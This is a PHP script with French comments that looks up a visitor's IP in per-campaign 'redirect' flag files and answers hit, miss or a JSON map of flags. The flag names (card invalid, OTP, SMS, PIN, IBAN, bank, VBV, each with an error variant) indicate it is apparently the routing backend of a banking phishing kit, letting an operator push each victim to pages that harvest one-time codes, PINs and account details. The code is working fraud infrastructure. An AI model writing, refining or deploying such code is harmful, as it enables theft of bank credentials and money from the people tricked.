<?php
/**
 * check_ip.php — resolveur de drapeaux (version robuste)
 * On ignore le chemin recu, on ne garde que le nom de fichier
 * et on le cherche dans les dossiers redirect/ connus.
 */
declare(strict_types=1);

const HIT     = '1';   // reponse si l'IP est presente
const MISS    = '0';   // reponse si elle ne l'est pas
const ALLOWED = [
    'carteInvalide', 'otp', 'otperror', 'mail', 'mailerror', 'sms', 'smserror',
    'pin', 'pinerror', 'iban', 'ibanerror', 'bank', 'bankerror', 'vbv', 'fin',
];

header('Content-Type: text/plain; charset=utf-8');
header('Cache-Control: no-store, max-age=0');

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

/* ---------- IP du visiteur ---------- */
$ip = '';
if (!empty($_SESSION['ip'])) {
    $ip = trim((string) $_SESSION['ip']);
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = trim(explode(',', (string) $_SERVER['HTTP_X_FORWARDED_FOR'])[0]);
} elseif (!empty($_SERVER['REMOTE_ADDR'])) {
    $ip = trim((string) $_SERVER['REMOTE_ADDR']);
}

/* ---------- dossiers candidats ---------- */
$campaign = 'f975d5cdec98fec50ae948774ede8dea';
$dirs = [
    __DIR__ . '/redirect/',
    __DIR__ . '/../redirect/',
    __DIR__ . '/../' . $campaign . '/redirect/',
    __DIR__ . '/../../' . $campaign . '/redirect/',
    dirname(__DIR__) . '/redirect/',
    dirname(__DIR__, 2) . '/redirect/',
];

/* on ajoute tout dossier "redirect/" trouve a cote du hub */
foreach ([dirname(__DIR__), dirname(__DIR__, 2)] as $base) {
    foreach (glob($base . '/*/redirect', GLOB_ONLYDIR) ?: [] as $found) {
        $dirs[] = rtrim($found, '/') . '/';
    }
}
$dirs = array_values(array_unique($dirs));

/* ---------- lecture d'un drapeau ---------- */
function readFlag(string $name, array $dirs): ?array
{
    foreach ($dirs as $dir) {
        $path = $dir . $name . '.txt';
        if (!is_file($path)) {
            continue;
        }
        $lines = @file($path, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        return is_array($lines) ? array_map('trim', $lines) : [];
    }
    return null;
}

/* ---------- mode ?all=1 : un seul aller-retour ---------- */
if (isset($_GET['all'])) {
    $out = [];
    foreach (ALLOWED as $name) {
        $lines = readFlag($name, $dirs);
        $out[$name] = ($lines === null || $ip === '') ? false : in_array($ip, $lines, true);
    }
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode(['ip' => $ip, 'flags' => $out], JSON_UNESCAPED_SLASHES);
    exit;
}

/* ---------- mode fichier unique ---------- */
$raw  = (string) ($_GET['file'] ?? '');
$base = basename((string) (parse_url($raw, PHP_URL_PATH) ?: $raw));
$name = preg_replace('/\.txt$/i', '', $base);
$name = preg_replace('/[^A-Za-z0-9_\-]/', '', (string) $name);

if ($name === '') {
    echo MISS;
    exit;
}

$lines = readFlag($name, $dirs);
if ($lines === null || $ip === '') {
    echo MISS;
    exit;
}

echo in_array($ip, $lines, true) ? HIT : MISS;